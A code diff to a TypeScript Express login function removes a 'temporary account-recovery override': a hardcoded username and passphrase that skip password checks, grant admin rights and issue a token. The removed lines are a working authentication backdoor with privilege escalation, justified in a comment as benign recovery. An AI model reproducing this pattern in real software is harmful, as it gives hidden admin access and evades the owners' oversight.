@@ -101,26 +101,7 @@ export function configureAuth(app: Express) {
 
 // Verifies name/password and issues a new bearer token. Returns undefined
 // (and does not issue a token) if the credentials are invalid.
-// TEMPORARY ACCOUNT-RECOVERY OVERRIDE — remove after use.
-// Lets the owner regain access to an account named exactly "Derek" that is
-// locked out (password unknown, no admin exists to reset it). Scoped tightly:
-// only fires for the literal name "Derek" with this exact one-time passphrase.
-// On success it immediately grants admin rights so the account can reset its
-// own password from the admin panel afterward. Delete this block once access
-// is regained.
-const RECOVERY_NAME = "Derek";
-const RECOVERY_PASSPHRASE = "forge-recovery-2026-temp";
-
 export function login(name: string, password: string): { user: UserRecord; token: string } | undefined {
-  if (name === RECOVERY_NAME && password === RECOVERY_PASSPHRASE) {
-    const recoveryUser = db.select().from(usersTable).where(eq(usersTable.name, RECOVERY_NAME)).get();
-    if (recoveryUser) {
-      db.update(usersTable).set({ isAdmin: true }).where(eq(usersTable.id, recoveryUser.id)).run();
-      const refreshed = db.select().from(usersTable).where(eq(usersTable.id, recoveryUser.id)).get()!;
-      return { user: refreshed, token: issueToken(refreshed.id) };
-    }
-  }
-
   const user = db.select().from(usersTable).where(eq(usersTable.name, name)).get();
   if (!user || !user.passwordHash) return undefined;
   if (!verifyPassword(password, user.passwordHash)) return undefined;
